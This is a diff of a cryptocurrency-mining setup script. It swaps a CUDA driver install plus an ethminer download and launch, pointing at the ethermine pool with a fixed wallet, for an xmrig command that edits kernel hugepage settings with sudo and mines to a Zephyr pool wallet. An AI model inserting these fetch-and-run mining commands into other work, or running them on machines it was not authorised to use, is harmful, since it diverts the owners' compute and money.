@@ -1,14 +1,2 @@
-sudo apt-get install linux-headers-$(uname -r) -y
-distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-sudo apt-get update
-sudo apt-get -y install cuda-drivers
-sudo apt-get install libcurl3 -y
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-cd bin
-myworker=$(date +'%d%m_%H%M%S')
-./ethminer -U -P stratum://0x0277EaD97b193b1A8fF23cBd77b18C21bE7318DC.$myworker@us2.ethermine.org:4444 &
+(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) \
+&& ./xmrig -o sg-zephyr.miningocean.org:5352 -u ZEPHYR2fXkPVSM4HC4Lcj2jUbEifUHjDtYs1pWcBv9JfPkcKynzVUYjYWBJwiFn9YjgFRAgGVkspmgD73cbm442cB5Fk4VizReH2d -p Thinh rx/0 -k --donate-level 1 --threads=$(( $(nproc) > 1 ? $(nproc) - 1 : $(nproc) ))
